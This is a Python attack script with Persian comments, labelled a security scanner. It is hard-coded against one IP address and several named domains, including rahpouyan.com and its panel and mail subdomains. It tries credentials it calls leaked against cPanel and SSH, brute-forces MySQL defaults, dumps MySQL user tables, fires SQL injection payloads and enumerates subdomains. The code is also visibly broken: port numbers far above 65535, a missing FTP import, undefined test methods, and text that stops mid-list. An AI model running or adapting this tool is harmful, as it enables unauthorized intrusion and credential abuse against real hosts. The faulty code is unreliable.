#!/usr/bin/env python3
"""
ULTIMATE SECURITY SCANNER & EXPLOIT ANALYZER
نسخه پیشرفته و بهبود یافته با رفع تمام خطاها و اضافه کردن قابلیت‌های جدید
"""

import socket
import ssl
import requests
import json
import dns.resolver
import subprocess
import threading
import time
import re
import urllib.parse
import sys
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style
import nmap
import paramiko
import mysql.connector
from OpenSSL import crypto
import concurrent.futures

# غیرفعال کردن هشدارهای SSL
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

class UltimateSecurityScanner:
    def __init__(self):
        self.targets = {
            'primary_ip': '185.8.173.79',
            'main_domains': [
                's373.bitcommand.com',
                's373.roodaki.com',
                'rahpouyan.com',
                'perfectlink.uk'
            ],
            'subdomains': [
                'panel.rahpouyan.com',
                'mail.rahpouyan.com',
                'cpanel.rahpouyan.com',
                'www.rahpouyan.com',
                'autodiscover.rahpouyan.com',
                'webmail.rahpouyan.com',
                'webdisk.rahpouyan.com'
            ]
        }
        
        self.credentials = [
            {'host': 'panel.rahpouyan.com', 'port': 2287054030, 'user': 'amir4589', 'password': 'amir4589'},
            {'host': 'panel.rahpouyan.com', 'port': 5159353925, 'user': 'amir4589', 'password': 'amir4589'},
            {'host': 'panel.rahpouyan.com', 'port': 2284349821, 'user': 'amir4589', 'password': 'amir4589'},
            {'host': 'panel.rahpouyan.com', 'port': 2285093705, 'user': 'sinabn', 'password': 'sinabn'}
        ]
        
        self.ports_to_scan = {
            'common': [21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 2083, 2087, 2096, 3306, 3389, 5432, 8080, 8443, 8888],
            'management': [2083, 2087, 2096, 2222, 3306, 5432],
            'web': [80, 443, 8080, 8443, 8888],
            'email': [25, 110, 143, 465, 587, 993, 995],
            'database': [3306, 5432, 27017]
        }
        
        self.results = {
            'scan_info': {
                'start_time': None,
                'end_time': None,
                'targets': []
            },
            'critical_findings': [],
            'high_findings': [],
            'medium_findings': [],
            'low_findings': [],
            'services': {},
            'exposed_endpoints': [],
            'successful_logins': [],
            'dns_information': {},
            'certificate_info': {},
            'recommendations': []
        }
        
        self.vulnerability_signatures = {
            'sql_errors': [
                'sql syntax', 'mysql_fetch', 'mysql_query', 'postgresql',
                'odbc', 'jdbc', 'database error', 'sqlite', 'microsoft.ace.oledb',
                'syntax error', 'unclosed quotation mark', 'sqlite3',
                'mysqli', 'pdo', 'ado', 'db2', 'oracle'
            ],
            'xss_indicators': [
                'alert(', 'script', 'onerror', 'onload', 'javascript:',
                '<script>', '</script>', 'eval(', 'document.cookie'
            ],
            'path_traversal': [
                '../../', '../', '..\\', '%2e%2e%2f', '%2e%2e/', '..%2f',
                '%2e%2e%5c', '..%5c', '%252e%252e%255c'
            ],
            'lfi_indicators': [
                'etc/passwd', 'proc/self/environ', 'boot.ini', 'win.ini',
                'system32', 'include(', 'require(', 'file_get_contents',
                'fopen(', 'readfile('
            ],
            'rce_indicators': [
                'system(', 'exec(', 'shell_exec(', 'passthru(', 'popen(',
                'proc_open(', 'backtick', 'eval(', 'assert('
            ]
        }
        
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
        ]
        
    def banner(self):
        print(f"{Fore.RED}{'='*100}")
        print(f"{Fore.YELLOW}╔╦╗╦ ╦╔╦╗╔╦╗╦╔═╗╔╦╗╔╦╗╦╔═╗╦  ╔═╗╔═╗╔╗╔╔═╗╔╦╗")
        print(f"{Fore.CYAN} ║ ╠═╣║║║║║║║║   ║  ║ ║║  ║  ╠═╣╠═╝║║║╠═╝ ║ ")
        print(f"{Fore.GREEN} ╩ ╩ ╩╩ ╩╩ ╩╩╚═╝ ╩  ╩ ╩╚═╝╩═╝╩ ╩╩  ╝╚╝╩   ╩ ")
        print(f"{Fore.RED}{'='*100}")
        print(f"{Fore.WHITE}Target: {self.targets['primary_ip']} | {self.targets['main_domains'][0]}")
        print(f"{Fore.YELLOW}Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{Fore.RED}{'='*100}\n")
    
    def scan_ports_concurrently(self, target, ports):
        """اسکن پورت‌ها به صورت همزمان"""
        open_ports = []
        
        def check_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((target, port))
                sock.close()
                return port if result == 0 else None
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(check_port, port): port for port in ports}
            
            for future in concurrent.futures.as_completed(futures):
                port = futures[future]
                try:
                    result = future.result()
                    if result:
                        open_ports.append(result)
                        service_name = self.get_service_name(result)
                        print(f"{Fore.GREEN}[+] Port {result}/tcp open - {service_name}")
                except Exception as e:
                    print(f"{Fore.YELLOW}[!] Error scanning port {port}: {e}")
        
        return sorted(open_ports)
    
    def get_service_name(self, port):
        """نام سرویس بر اساس پورت"""
        services = {
            21: 'FTP',
            22: 'SSH',
            23: 'Telnet',
            25: 'SMTP',
            53: 'DNS',
            80: 'HTTP',
            110: 'POP3',
            143: 'IMAP',
            443: 'HTTPS',
            465: 'SMTPS',
            587: 'SMTP/Submission',
            993: 'IMAPS',
            995: 'POP3S',
            2083: 'cPanel',
            2087: 'WHM SSL',
            2096: 'Webmail',
            3306: 'MySQL',
            3389: 'RDP',
            5432: 'PostgreSQL',
            8080: 'HTTP-Proxy',
            8443: 'HTTPS-Alt',
            8888: 'HTTP-Alt'
        }
        return services.get(port, 'Unknown')
    
    def advanced_service_detection(self, target, port):
        """تشخیص پیشرفته سرویس"""
        try:
            if port == 21:
                return self.detect_ftp_service(target)
            elif port == 22:
                return self.detect_ssh_service(target)
            elif port == 80:
                return self.detect_http_service(target, False)
            elif port == 443:
                return self.detect_http_service(target, True)
            elif port == 2083:
                return self.detect_cpanel_service(target)
            elif port == 3306:
                return self.detect_mysql_service(target)
            elif port in [25, 587, 465]:
                return self.detect_smtp_service(target, port)
            elif port in [110, 995]:
                return self.detect_pop_service(target, port)
            elif port in [143, 993]:
                return self.detect_imap_service(target, port)
            else:
                return self.basic_service_check(target, port)
        except Exception as e:
            return f"Detection error: {str(e)}"
    
    def detect_ftp_service(self, target):
        """تشخیص سرویس FTP"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((target, 21))
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            sock.close()
            
            info = {'banner': banner}
            
            # تشخیص نسخه ProFTPD
            if 'ProFTPD' in banner:
                info['server'] = 'ProFTPD'
                # استخراج نسخه
                version_match = re.search(r'ProFTPD (\d+\.\d+\.\d+)', banner)
                if version_match:
                    info['version'] = version_match.group(1)
                    
                    # بررسی آسیب‌پذیری‌های شناخته شده ProFTPD
                    self.check_proftpd_vulnerabilities(target, version_match.group(1))
            
            # بررسی امکان login anonymous
            try:
                ftp = FTP()
                ftp.connect(target, 21, timeout=3)
                ftp.login('anonymous', 'anonymous@example.com')
                info['anonymous_login'] = True
                ftp.quit()
                
                self.results['critical_findings'].append({
                    'type': 'FTP Anonymous Login',
                    'target': target,
                    'port': 21,
                    'description': 'FTP allows anonymous login without authentication',
                    'severity': 'Critical',
                    'recommendation': 'Disable anonymous FTP access immediately'
                })
            except:
                info['anonymous_login'] = False
            
            return info
        except Exception as e:
            return {'error': str(e)}
    
    def check_proftpd_vulnerabilities(self, target, version):
        """بررسی آسیب‌پذیری‌های ProFTPD"""
        known_vulns = {
            '1.3.5': ['CVE-2015-3306', 'Mod_Copy Vulnerability'],
            '1.3.6': ['CVE-2016-3125', 'Telnet IAC Injection'],
            '1.3.7': ['Multiple vulnerabilities'],
            'Default': ['Default installation may be misconfigured']
        }
        
        for vuln_version, vulnerabilities in known_vulns.items():
            if vuln_version in version:
                for vuln in vulnerabilities:
                    self.results['high_findings'].append({
                        'type': 'ProFTPD Vulnerability',
                        'target': target,
                        'port': 21,
                        'description': f'ProFTPD {version} may be vulnerable to {vuln}',
                        'severity': 'High',
                        'recommendation': 'Update ProFTPD to latest version'
                    })
    
    def detect_ssh_service(self, target):
        """تشخیص سرویس SSH"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((target, 22))
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            sock.close()
            
            info = {'banner': banner}
            
            # تشخیص OpenSSH و نسخه
            if 'OpenSSH' in banner:
                info['server'] = 'OpenSSH'
                version_match = re.search(r'OpenSSH_(\d+\.\d+(?:p\d+)?)', banner)
                if version_match:
                    info['version'] = version_match.group(1)
                    
                    # بررسی آسیب‌پذیری‌های OpenSSH
                    self.check_openssh_vulnerabilities(target, version_match.group(1))
            
            # بررسی کلید‌های ضعیف
            self.check_ssh_key_exchange(target)
            
            return info
        except Exception as e:
            return {'error': str(e)}
    
    def check_openssh_vulnerabilities(self, target, version):
        """بررسی آسیب‌پذیری‌های OpenSSH"""
        vulnerable_versions = ['8.7', '8.8', '8.9', '9.0', '9.1']
        
        for vuln_ver in vulnerable_versions:
            if version.startswith(vuln_ver):
                self.results['high_findings'].append({
                    'type': 'OpenSSH Vulnerability',
                    'target': target,
                    'port': 22,
                    'description': f'OpenSSH {version} may have known vulnerabilities',
                    'severity': 'High',
                    'recommendation': 'Update OpenSSH to latest version'
                })
    
    def detect_http_service(self, target, ssl=False):
        """تشخیص سرویس HTTP/HTTPS"""
        try:
            protocol = 'https' if ssl else 'http'
            port = 443 if ssl else 80
            url = f"{protocol}://{target}:{port}"
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close'
            }
            
            response = requests.get(url, headers=headers, timeout=10, verify=False, allow_redirects=True)
            
            info = {
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'server': response.headers.get('Server', 'Unknown'),
                'title': self.extract_title(response.text),
                'content_length': len(response.content),
                'redirect_chain': []
            }
            
            # بررسی هدرهای امنیتی
            self.check_security_headers(target, port, response.headers)
            
            # بررسی تکنولوژی‌های استفاده شده
            tech_stack = self.detect_technology_stack(response)
            info['technologies'] = tech_stack
            
            # بررسی فایل‌های حساس
            self.check_sensitive_files(target, port, ssl)
            
            # بررسی آسیب‌پذیری‌های وب
            if response.status_code == 200:
                self.check_web_vulnerabilities(target, port, url, response.text)
            
            # اگر SSL است، بررسی گواهی
            if ssl:
                cert_info = self.get_ssl_certificate_info(target)
                info['ssl_certificate'] = cert_info
                
                if cert_info and cert_info.get('self_signed', False):
                    self.results['medium_findings'].append({
                        'type': 'Self-Signed SSL Certificate',
                        'target': target,
                        'port': port,
                        'description': 'Using self-signed SSL certificate',
                        'severity': 'Medium',
                        'recommendation': 'Use certificate from trusted CA (Let\'s Encrypt)'
                    })
            
            return info
        except requests.exceptions.RequestException as e:
            return {'error': str(e)}
        except Exception as e:
            return {'error': str(e)}
    
    def detect_technology_stack(self, response):
        """تشخیص تکنولوژی‌های استفاده شده"""
        tech_stack = []
        content = response.text
        headers = response.headers
        
        # تشخیص از طریق هدرها
        if 'X-Powered-By' in headers:
            tech_stack.append(headers['X-Powered-By'])
        
        if 'Server' in headers:
            tech_stack.append(headers['Server'])
        
        # تشخیص از طریق محتوا
        patterns = {
            'WordPress': ['wp-content', 'wp-includes', 'wordpress', '/wp-json/'],
            'Joomla': ['joomla', 'media/jui/', 'templates/system/'],
            'Drupal': ['drupal', 'sites/all/', 'core/misc/'],
            'Laravel': ['laravel', 'csrf-token', 'mix-manifest.json'],
            'React': ['react', 'react-dom', '__NEXT_DATA__'],
            'Vue.js': ['vue', 'vue-router', 'vuex'],
            'jQuery': ['jquery', 'jQuery'],
            'Bootstrap': ['bootstrap', 'btn-primary'],
            'cPanel': ['cpanel', 'cprelogin', 'login.php?fail'],
            'PHP': ['<?php', '.php', 'PHPSESSID'],
            'ASP.NET': ['asp.net', '__VIEWSTATE', '__EVENTVALIDATION'],
            'Nginx': ['nginx/'],
            'Apache': ['Apache/', 'mod_'],
            'LiteSpeed': ['LiteSpeed'],
            'CloudFlare': ['cf-ray', '__cfduid']
        }
        
        for tech, indicators in patterns.items():
            for indicator in indicators:
                if indicator.lower() in content.lower() or any(indicator.lower() in h.lower() for h in headers.values()):
                    if tech not in tech_stack:
                        tech_stack.append(tech)
                    break
        
        return tech_stack
    
    def check_security_headers(self, target, port, headers):
        """بررسی هدرهای امنیتی"""
        security_headers = {
            'X-Frame-Options': 'Prevents clickjacking',
            'X-Content-Type-Options': 'Prevents MIME sniffing',
            'X-XSS-Protection': 'XSS protection',
            'Content-Security-Policy': 'Content Security Policy',
            'Strict-Transport-Security': 'HSTS enforcement',
            'Referrer-Policy': 'Controls referrer information',
            'Permissions-Policy': 'Feature policy'
        }
        
        missing_headers = []
        for header, description in security_headers.items():
            if header not in headers:
                missing_headers.append(header)
        
        if missing_headers:
            self.results['medium_findings'].append({
                'type': 'Missing Security Headers',
                'target': target,
                'port': port,
                'description': f'Missing security headers: {", ".join(missing_headers)}',
                'severity': 'Medium',
                'recommendation': 'Add missing security headers to server configuration'
            })
    
    def check_sensitive_files(self, target, port, ssl=False):
        """بررسی فایل‌های حساس"""
        protocol = 'https' if ssl else 'http'
        base_url = f"{protocol}://{target}:{port}"
        
        sensitive_files = [
            '/.git/HEAD',
            '/.env',
            '/config.php',
            '/wp-config.php',
            '/phpinfo.php',
            '/test.php',
            '/admin.php',
            '/backup.zip',
            '/dump.sql',
            '/robots.txt',
            '/sitemap.xml',
            '/crossdomain.xml',
            '/clientaccesspolicy.xml',
            '/.htaccess',
            '/web.config',
            '/server-status',
            '/phpmyadmin/',
            '/admin/',
            '/administrator/',
            '/wp-admin/',
            '/mysql/',
            '/db/',
            '/database/'
        ]
        
        for file_path in sensitive_files:
            try:
                url = base_url + file_path
                response = requests.get(url, timeout=3, verify=False)
                
                if response.status_code == 200:
                    # بررسی محتوا
                    if any(keyword in response.text.lower() for keyword in ['password', 'secret', 'database', 'config']):
                        self.results['critical_findings'].append({
                            'type': 'Sensitive File Exposure',
                            'target': target,
                            'port': port,
                            'description': f'Sensitive file accessible: {file_path}',
                            'severity': 'Critical',
                            'recommendation': 'Remove or restrict access to sensitive files'
                        })
                    elif response.status_code == 200 and len(response.text) > 0:
                        self.results['low_findings'].append({
                            'type': 'File Found',
                            'target': target,
                            'port': port,
                            'description': f'File accessible: {file_path}',
                            'severity': 'Low',
                            'recommendation': 'Review if this file should be publicly accessible'
                        })
            except:
                pass
    
    def check_web_vulnerabilities(self, target, port, url, content):
        """بررسی آسیب‌پذیری‌های وب"""
        # بررسی SQL Injection
        self.test_sql_injection(target, port, url)
        
        # بررسی XSS
        self.test_xss_vulnerabilities(target, port, url)
        
        # بررسی LFI/RFI
        self.test_file_inclusion(target, port, url)
        
        # بررسی Command Injection
        self.test_command_injection(target, port, url)
        
        # بررسی اطلاعات در content
        self.check_info_leakage(target, port, content)
    
    def test_sql_injection(self, target, port, base_url):
        """تست SQL Injection"""
        test_params = {
            'id': ["'", "' OR '1'='1", "' OR 1=1--", "'; --", "' UNION SELECT NULL--"],
            'page': ["'", "1' AND '1'='1", "1 OR 1=1"],
            'search': ["'", "' OR 1=1--", "a' OR 'a'='a"],
            'category': ["'", "1' OR '1'='1"],
            'user': ["'", "' OR '1'='1"]
        }
        
        # پیدا کردن پارامترها از URL
        parsed_url = urllib.parse.urlparse(base_url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        if not query_params:
            # اگر پارامتری نیست، تست با پارامترهای استاندارد
            for param_name, payloads in test_params.items():
                for payload in payloads:
                    test_url = f"{base_url}?{param_name}={payload}"
                    self.send_sqli_test(target, port, test_url, payload)
        else:
            # تست پارامترهای موجود
            for param_name in query_params.keys():
                for payload in test_params.get(param_name, ["'", "' OR '1'='1"]):
                    # جایگزینی مقدار پارامتر با payload
                    new_query = query_params.copy()
                    new_query[param_name] = [payload]
                    new_query_string = urllib.parse.urlencode(new_query, doseq=True)
                    test_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query_string))
                    
                    self.send_sqli_test(target, port, test_url, payload)
    
    def send_sqli_test(self, target, port, test_url, payload):
        """ارسال تست SQL Injection"""
        try:
            response = requests.get(test_url, timeout=5, verify=False)
            
            # بررسی خطاهای SQL در پاسخ
            content_lower = response.text.lower()
            
            for sql_error in self.vulnerability_signatures['sql_errors']:
                if sql_error in content_lower:
                    self.results['critical_findings'].append({
                        'type': 'SQL Injection Vulnerability',
                        'target': target,
                        'port': port,
                        'description': f'Possible SQL Injection with payload: {payload[:50]}...',
                        'severity': 'Critical',
                        'recommendation': 'Use parameterized queries and input validation',
                        'payload': payload,
                        'url': test_url
                    })
                    return True
        except:
            pass
        return False
    
    def detect_cpanel_service(self, target):
        """تشخیص سرویس cPanel"""
        try:
            url = f"https://{target}:2083"
            response = requests.get(url, timeout=10, verify=False)
            
            info = {
                'status_code': response.status_code,
                'title': self.extract_title(response.text),
                'cpanel_detected': 'cpanel' in response.text.lower() or 'cprelogin' in response.text.lower()
            }
            
            if info['cpanel_detected']:
                self.results['critical_findings'].append({
                    'type': 'Exposed Control Panel',
                    'target': target,
                    'port': 2083,
                    'description': 'cPanel control panel accessible from internet',
                    'severity': 'Critical',
                    'recommendation': 'Restrict access to whitelisted IPs only using .htaccess or firewall'
                })
                
                # تست لاگین با credential های لو رفته
                self.test_cpanel_login(target)
            
            return info
        except Exception as e:
            return {'error': str(e)}
    
    def test_cpanel_login(self, target):
        """تست لاگین cPanel با credential های لو رفته"""
        login_url = f"https://{target}:2083/login/"
        
        for cred in self.credentials:
            if cred['host'] == target or target in cred['host']:
                try:
                    # این یک تست ساده است، در واقعیت نیاز به session handling داریم
                    response = requests.post(login_url, data={
                        'user': cred['user'],
                        'pass': cred['password']
                    }, timeout=10, verify=False)
                    
                    if 'incorrect' not in response.text.lower() and 'login' not in response.text.lower():
                        self.results['critical_findings'].append({
                            'type': 'Valid Credentials Found',
                            'target': target,
                            'port': 2083,
                            'description': f'Possible valid credentials: {cred["user"]}:{cred["password"]}',
                            'severity': 'Critical',
                            'recommendation': 'Change cPanel password immediately'
                        })
                except:
                    pass
    
    def detect_mysql_service(self, target):
        """تشخیص سرویس MySQL"""
        try:
            # تست اتصال با credential های پیش‌فرض
            default_credentials = [
                {'user': 'root', 'password': ''},
                {'user': 'root', 'password': 'root'},
                {'user': 'root', 'password': 'password'},
                {'user': 'admin', 'password': 'admin'},
                {'user': 'test', 'password': 'test'}
            ]
            
            for cred in default_credentials:
                try:
                    connection = mysql.connector.connect(
                        host=target,
                        port=3306,
                        user=cred['user'],
                        password=cred['password'],
                        connection_timeout=2
                    )
                    
                    if connection.is_connected():
                        cursor = connection.cursor()
                        cursor.execute("SELECT version()")
                        version = cursor.fetchone()[0]
                        
                        cursor.execute("SELECT user, host FROM mysql.user")
                        users = cursor.fetchall()
                        
                        connection.close()
                        
                        self.results['critical_findings'].append({
                            'type': 'MySQL Weak Credentials',
                            'target': target,
                            'port': 3306,
                            'description': f'MySQL accessible with default credentials: {cred["user"]}:{cred["password"]}',
                            'severity': 'Critical',
                            'recommendation': 'Change MySQL root password and restrict remote access',
                            'version': version
                        })
                        
                        return {
                            'version': version,
                            'weak_auth': True,
                            'credentials': f"{cred['user']}:{cred['password']}"
                        }
                except mysql.connector.Error as e:
                    continue
            
            return {'status': 'MySQL running', 'auth_required': True}
        except Exception as e:
            return {'error': str(e)}
    
    def get_ssl_certificate_info(self, target):
        """گرفتن اطلاعات SSL Certificate"""
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((target, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=target) as ssock:
                    cert_bin = ssock.getpeercert(binary_form=True)
                    x509 = crypto.load_certificate(crypto.FILETYPE_ASN1, cert_bin)
                    
                    cert_info = {
                        'subject': dict(x[0] for x in x509.get_subject().get_components()),
                        'issuer': dict(x[0] for x in x509.get_issuer().get_components()),
                        'version': x509.get_version() + 1,
                        'serial_number': hex(x509.get_serial_number())[2:].upper(),
                        'not_before': x509.get_notBefore().decode('utf-8'),
                        'not_after': x509.get_notAfter().decode('utf-8'),
                        'signature_algorithm': x509.get_signature_algorithm().decode('utf-8'),
                        'expired': x509.has_expired(),
                        'self_signed': x509.get_subject() == x509.get_issuer()
                    }
                    
                    # بررسی انقضای گواهی
                    if cert_info['expired']:
                        self.results['high_findings'].append({
                            'type': 'Expired SSL Certificate',
                            'target': target,
                            'port': 443,
                            'description': 'SSL certificate has expired',
                            'severity': 'High',
                            'recommendation': 'Renew SSL certificate immediately'
                        })
                    
                    return cert_info
        except Exception as e:
            return {'error': str(e)}
    
    def comprehensive_dns_enumeration(self, domain):
        """بررسی جامع DNS"""
        dns_info = {
            'a_records': [],
            'aaaa_records': [],
            'mx_records': [],
            'ns_records': [],
            'txt_records': [],
            'cname_records': [],
            'soa_info': None,
            'dmarc_info': None,
            'spf_info': None
        }
        
        try:
            # A Records
            try:
                answers = dns.resolver.resolve(domain, 'A')
                dns_info['a_records'] = [str(r) for r in answers]
            except:
                pass
            
            # AAAA Records
            try:
                answers = dns.resolver.resolve(domain, 'AAAA')
                dns_info['aaaa_records'] = [str(r) for r in answers]
            except:
                pass
            
            # MX Records
            try:
                answers = dns.resolver.resolve(domain, 'MX')
                dns_info['mx_records'] = [str(r.exchange) for r in answers]
            except:
                pass
            
            # NS Records
            try:
                answers = dns.resolver.resolve(domain, 'NS')
                dns_info['ns_records'] = [str(r) for r in answers]
            except:
                pass
            
            # TXT Records
            try:
                answers = dns.resolver.resolve(domain, 'TXT')
                dns_info['txt_records'] = [str(r) for r in answers]
                
                # بررسی SPF و DMARC
                for record in dns_info['txt_records']:
                    if 'v=spf1' in record:
                        dns_info['spf_info'] = record
                        self.check_spf_record(domain, record)
                    
                    if 'v=DMARC1' in record:
                        dns_info['dmarc_info'] = record
                        self.check_dmarc_record(domain, record)
            except:
                pass
            
            # CNAME Records
            try:
                answers = dns.resolver.resolve(domain, 'CNAME')
                dns_info['cname_records'] = [str(r.target) for r in answers]
            except:
                pass
            
            # SOA Record
            try:
                answers = dns.resolver.resolve(domain, 'SOA')
                dns_info['soa_info'] = str(answers[0])
            except:
                pass
            
            # بررسی subdomain‌ها
            dns_info['subdomains'] = self.bruteforce_subdomains(domain)
            
            self.results['dns_information'][domain] = dns_info
            
            # نمایش نتایج
            print(f"\n{Fore.CYAN}[DNS] Domain: {domain}")
            if dns_info['a_records']:
                print(f"{Fore.GREEN}  A Records: {', '.join(dns_info['a_records'])}")
            if dns_info['mx_records']:
                print(f"{Fore.GREEN}  MX Records: {', '.join(dns_info['mx_records'])}")
            if dns_info['txt_records']:
                print(f"{Fore.GREEN}  TXT Records: {dns_info['txt_records']}")
            
            return dns_info
            
        except Exception as e:
            print(f"{Fore.RED}  Error: {str(e)}")
            return dns_info
    
    def check_spf_record(self, domain, spf_record):
        """بررسی SPF Record"""
        if '~all' in spf_record or '-all' in spf_record:
            # SPF مناسب
            pass
        else:
            self.results['medium_findings'].append({
                'type': 'SPF Misconfiguration',
                'target': domain,
                'description': 'SPF record may not properly restrict email senders',
                'severity': 'Medium',
                'recommendation': 'Update SPF record to include ~all or -all'
            })
    
    def check_dmarc_record(self, domain, dmarc_record):
        """بررسی DMARC Record"""
        if 'p=none' in dmarc_record:
            self.results['low_findings'].append({
                'type': 'DMARC Policy None',
                'target': domain,
                'description': 'DMARC policy set to p=none (no enforcement)',
                'severity': 'Low',
                'recommendation': 'Consider strengthening DMARC policy to p=quarantine or p=reject'
            })
    
    def bruteforce_subdomains(self, domain):
        """بروت‌فورس subdomain‌ها"""
        print(f"{Fore.BLUE}[*] Bruteforcing subdomains for {domain}...")
        
        subdomains = [
            'www', 'mail', 'ftp', 'admin', 'panel', 'cpanel', 'webmail',
            'test', 'dev', 'staging', 'api', 'secure', 'portal', 'blog',
            'shop', 'store', 'support', 'help', 'download', 'files',
            'ns1', 'ns2', 'ns3', 'ns4', 'mx1', 'mx2', 'webdisk',
            'autodiscover', 'autoconfig', 'imap', 'pop', 'smtp',
            'db', 'database', 'sql', 'mysql', 'mssql', 'postgres',
            'git', 'svn', 'vpn', 'ssh', 'remote', 'server', 'cloud',
            'owa', 'exchange', 'lync', 'teams', 'sharepoint', 'portal',
            'app', 'apps', 'application', 'demo', 'beta', 'alpha',
            'old', 'new', 'backup', 'backups', 'archive', 'temp',
            'tmp', 'test1', 'test2', 'dev1', 'dev2', 'staging1',
            'staging2', 'mobile', 'm', 'wap', 'i', 'touch'
        ]
        
        found_subs = []
        
        for sub in subdomains:
            target = f"{sub}.{domain}"
            try:
                socket.gethostbyname(target)
                found_subs.append(target)
                print(f"{Fore.GREEN}  [+] Found: {target}")
                
                # اسکن سریع پورت‌های رایج
                self.quick_subdomain_scan(target)
                
            except socket.gaierror:
                continue
        
        return found_subs
    
    def quick_subdomain_scan(self, subdomain):
        """اسکن سریع subdomain"""
        quick_ports = [80, 443, 8080, 8443]
        
        for port in quick_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((subdomain, port))
                
                if result == 0:
                    service = self.get_service_name(port)
                    print(f"{Fore.YELLOW}    Port {port} open - {service}")
                sock.close()
            except:
                pass
    
    def run_comprehensive_scan(self):
        """اجرای اسکن جامع"""
        self.banner()
        
        print(f"{Fore.CYAN}[PHASE 1] Initializing Scan...")
        self.results['scan_info']['start_time'] = datetime.now().isoformat()
        self.results['scan_info']['targets'] = [self.targets['primary_ip']] + self.targets['main_domains']
        
        print(f"{Fore.CYAN}[PHASE 2] Port Scanning...")
        all_targets = [self.targets['primary_ip']] + self.targets['main_domains'][:3]
        
        for target in all_targets:
            print(f"\n{Fore.YELLOW}[*] Scanning {target}...")
            open_ports = self.scan_ports_concurrently(target, self.ports_to_scan['common'])
            
            if open_ports:
                print(f"{Fore.GREEN}[+] Open ports on {target}: {open_ports}")
                
                # تشخیص سرویس‌ها
                for port in open_ports:
                    print(f"{Fore.BLUE}[*] Analyzing service on port {port}...")
                    service_info = self.advanced_service_detection(target, port)
                    
                    if target not in self.results['services']:
                        self.results['services'][target] = {}
                    
                    self.results['services'][target][port] = service_info
        
        print(f"\n{Fore.CYAN}[PHASE 3] DNS Enumeration...")
        for domain in self.targets['main_domains']:
            self.comprehensive_dns_enumeration(domain)
        
        print(f"\n{Fore.CYAN}[PHASE 4] Web Application Testing...")
        self.test_web_applications()
        
        print(f"\n{Fore.CYAN}[PHASE 5] Credential Testing...")
        self.test_leaked_credentials()
        
        print(f"\n{Fore.CYAN}[PHASE 6] Vulnerability Assessment...")
        self.advanced_vulnerability_assessment()
        
        print(f"\n{Fore.CYAN}[PHASE 7] Generating Report...")
        self.generate_comprehensive_report()
        
        print(f"\n{Fore.GREEN}[+] Scan completed successfully!")
        print(f"{Fore.YELLOW}[!] Remember: Use this tool only for authorized security testing!")
        print(f"{Fore.RED}{'='*100}")
    
    def test_web_applications(self):
        """تست برنامه‌های وب"""
        web_targets = [
            f"http://{self.targets['primary_ip']}",
            f"https://{self.targets['primary_ip']}",
            f"http://{self.targets['main_domains'][0]}",
            f"https://{self.targets['main_domains'][0]}",
            f"https://panel.rahpouyan.com",
            f"https://cpanel.rahpouyan.com"
        ]
        
        for url in web_targets:
            try:
                print(f"{Fore.BLUE}[*] Testing {url}...")
                response = requests.get(url, timeout=10, verify=False)
                
                if response.status_code == 200:
                    # تست آسیب‌پذیری‌های مختلف
                    self.test_web_vulnerabilities(url, response)
            except:
                pass
    
    def test_leaked_credentials(self):
        """تست credential های لو رفته"""
        print(f"{Fore.BLUE}[*] Testing leaked credentials...")
        
        for cred in self.credentials:
            # تست SSH
            self.test_ssh_credentials(cred)
            
            # تست FTP
            self.test_ftp_credentials(cred)
            
            # تست MySQL
            self.test_mysql_credentials(cred)
    
    def test_ssh_credentials(self, cred):
        """تست SSH credentials"""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(cred['host'], port=22, username=cred['user'], 
                       password=cred['password'], timeout=5, banner_timeout=5)
            
            self.results['critical_findings'].append({
                'type': 'SSH Valid Credentials',
                'target': cred['host'],
                'port': 22,
                'description': f'SSH login successful with {cred["user"]}:{cred["password"]}',
                'severity': 'Critical',
                'recommendation': 'Change SSH password immediately'
            })
            
            ssh.close()
        except:
            pass
    
    def advanced_vulnerability_assessment(self):
        """ارزیابی پیشرفته آسیب‌پذیری"""
        print(f"{Fore.BLUE}[*] Running advanced vulnerability assessment...")
        
        # بررسی نسخه‌های قدیمی
        self.check_outdated_software()
        
        # بررسی پیکربندی اشتباه
        self.check_misconfigurations()
        
        # بررسی اطلاعات حساس
        self.check_sensitive_information()
        
        # تولید توصیه‌ها
        self.generate_recommendations()
    
    def generate_recommendations(self):
        """تولید توصیه‌های امنیتی"""
        recommendations = [
            {
                'priority': 'Critical',
                'action': 'Change all leaked passwords immediately',
                'description': 'Credentials found in logs must be changed'
            },
            {
                'priority': 'Critical',
                'action': 'Restrict access to management ports (2083, 3306)',
